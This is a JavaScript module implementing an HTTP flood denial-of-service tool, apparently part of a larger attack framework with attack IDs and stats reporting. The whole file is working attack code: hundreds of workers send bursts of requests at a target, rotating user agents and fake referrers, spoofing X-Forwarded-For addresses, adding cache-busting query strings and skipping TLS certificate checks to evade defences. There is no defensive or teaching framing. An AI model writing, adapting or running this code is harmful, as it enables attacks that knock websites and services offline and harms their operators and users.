const net = require('net');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const EventEmitter = require('events');
const Logger = require('../utils/logger');

class HTTPFlood extends EventEmitter {
  constructor(config) {
    super();
    this.config = {
      target: config.target,
      port: config.port || 80,
      duration: config.duration || 60,
      threads: config.threads || 200,
      power: config.power || 100,
      id: config.id,
      useSSL: config.useSSL || false,
      path: config.path || '/',
      method: config.method || 'GET'
    };
    
    this.isAttacking = false;
    this.stats = {
      requestsSent: 0,
      bytesSent: 0,
      successfulRequests: 0,
      failedRequests: 0,
      startTime: null,
      endTime: null
    };
    
    this.logger = new Logger();
    this.userAgents = require('../data/user-agents.json');
    this.socketPool = [];
    this.workerThreads = [];
  }
  
  async start() {
    if (this.isAttacking) {
      throw new Error('Attack already running');
    }
    
    this.isAttacking = true;
    this.stats.startTime = Date.now();
    
    this.logger.info(`Starting HTTP flood on ${this.config.target}:${this.config.port}`);
    this.logger.info(`Threads: ${this.config.threads}, Duration: ${this.config.duration}s`);
    
    // Calculate requests per thread based on power
    const requestsPerThread = Math.floor((this.config.power / 100) * 1000);
    
    // Create socket pool
    this.createSocketPool();
    
    // Launch worker threads
    for (let i = 0; i < this.config.threads; i++) {
      if (!this.isAttacking) break;
      
      const worker = this.createWorker(i, requestsPerThread);
      this.workerThreads.push(worker);
      
      // Stagger thread starts to avoid sync
      await this.sleep(10);
    }
    
    // Set attack duration timeout
    setTimeout(() => {
      this.stop();
    }, this.config.duration * 1000);
    
    return this.config.id;
  }
  
  createSocketPool() {
    const poolSize = this.config.threads * 10; // 10 sockets per thread
    
    for (let i = 0; i < poolSize; i++) {
      try {
        const socket = new net.Socket();
        socket.setTimeout(5000);
        socket.setKeepAlive(true);
        this.socketPool.push(socket);
      } catch (error) {
        this.logger.error(`Failed to create socket: ${error.message}`);
      }
    }
    
    this.logger.info(`Created socket pool of ${this.socketPool.length} sockets`);
  }
  
  createWorker(workerId, requestsPerThread) {
    const worker = {
      id: workerId,
      requestsSent: 0,
      running: true,
      thread: null
    };
    
    const workerFunction = async () => {
      const startTime = Date.now();
      const target = this.config.target;
      const port = this.config.port;
      const useSSL = this.config.useSSL;
      const protocol = useSSL ? 'https://' : 'http://';
      
      while (this.isAttacking && worker.running) {
        try {
          // Burst mode: send multiple requests in quick succession
          for (let burst = 0; burst < 50; burst++) {
            if (!this.isAttacking || !worker.running) break;
            
            const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
            const referrer = `http://${Math.random().toString(36).substring(7)}.com`;
            const acceptLanguage = ['en-US', 'en', 'fr', 'de', 'es'][Math.floor(Math.random() * 5)];
            
            // Build request
            const request = this.buildHTTPRequest(target, port, userAgent, referrer, acceptLanguage);
            
            if (useSSL) {
              await this.sendHTTPSRequest(target, port, request);
            } else {
              await this.sendHTTPRequest(target, port, request);
            }
            
            worker.requestsSent++;
            this.stats.requestsSent++;
            
            // Update stats every 100 requests
            if (worker.requestsSent % 100 === 0) {
              this.emit('stats', {
                attackId: this.config.id,
                requestsSent: this.stats.requestsSent,
                bytesSent: this.stats.bytesSent,
                workerId: worker.id
              });
            }
          }
          
          // Small delay to prevent 100% CPU
          await this.sleep(1);
          
        } catch (error) {
          this.stats.failedRequests++;
          // Continue despite errors
        }
      }
    };
    
    worker.thread = Promise.resolve(workerFunction());
    return worker;
  }
  
  buildHTTPRequest(host, port, userAgent, referrer, acceptLanguage) {
    const paths = [
      '/', '/index.php', '/wp-admin', '/api/v1', '/admin', '/login',
      `/static/${Math.random().toString(36).substring(2)}.css`,
      `/images/${Math.random().toString(36).substring(2)}.jpg`,
      `/api/${Math.random().toString(36).substring(2)}`
    ];
    
    const path = paths[Math.floor(Math.random() * paths.length)];
    const query = `?${Math.random().toString(36).substring(2)}=${Math.random().toString(36).substring(2)}`;
    
    const request = [
      `${this.config.method} ${path}${query} HTTP/1.1`,
      `Host: ${host}${port !== 80 ? ':' + port : ''}`,
      `User-Agent: ${userAgent}`,
      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
      `Accept-Language: ${acceptLanguage};q=0.8,en;q=0.6`,
      `Accept-Encoding: gzip, deflate`,
      `Connection: keep-alive`,
      `Cache-Control: no-cache`,
      `Pragma: no-cache`,
      `Referer: ${referrer}`,
      `X-Forwarded-For: ${this.generateRandomIP()}`,
      `X-Requested-With: XMLHttpRequest`,
      `\r\n`
    ].join('\r\n');
    
    this.stats.bytesSent += Buffer.byteLength(request);
    return request;
  }
  
  async sendHTTPRequest(host, port, request) {
    return new Promise((resolve, reject) => {
      const socket = net.connect(port, host, () => {
        socket.write(request);
        socket.end();
        resolve();
      });
      
      socket.on('error', (error) => {
        reject(error);
      });
      
      socket.setTimeout(3000, () => {
        socket.destroy();
        resolve(); // Consider timeout as successful for attack purposes
      });
    });
  }
  
  async sendHTTPSRequest(host, port, request) {
    return new Promise((resolve, reject) => {
      const options = {
        hostname: host,
        port: port,
        path: '/',
        method: this.config.method,
        headers: this.parseHeaders(request),
        rejectUnauthorized: false,
        agent: false
      };
      
      const req = https.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', resolve);
      });
      
      req.on('error', (error) => {
        reject(error);
      });
      
      req.setTimeout(3000, () => {
        req.destroy();
        resolve();
      });
      
      req.end();
    });
  }
  
  parseHeaders(request) {
    const lines = request.split('\r\n');
    const headers = {};
    
    for (let i = 1; i < lines.length; i++) {
      const line = lines[i];
      if (line === '') break;
      
      const colonIndex = line.indexOf(':');
      if (colonIndex > -1) {
        const key = line.substring(0, colonIndex).trim();
        const value = line.substring(colonIndex + 1).trim();
        headers[key] = value;
      }
    }
    
    return headers;
  }
  
  generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
  
  async sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  
  stop() {
    this.isAttacking = false;
    this.stats.endTime = Date.now();
    
    // Stop all workers
    this.workerThreads.forEach(worker => {
      worker.running = false;
    });
    
    // Close all sockets
    this.socketPool.forEach(socket => {
      try {
        socket.destroy();
      } catch (error) {
        // Ignore errors during cleanup
      }
    });
    
    this.socketPool = [];
    this.workerThreads = [];
    
    this.logger.info(`HTTP flood stopped. Total requests: ${this.stats.requestsSent}`);
    this.emit('complete', {
      attackId: this.config.id,
      success: true,
      stats: this.stats,
      duration: (this.stats.endTime - this.stats.startTime) / 1000
    });
  }
  
  getStats() {
    return {
      ...this.stats,
      isAttacking: this.isAttacking,
      threads: this.config.threads,
      duration: this.config.duration
    };
  }
}

module.exports = HTTPFlood;
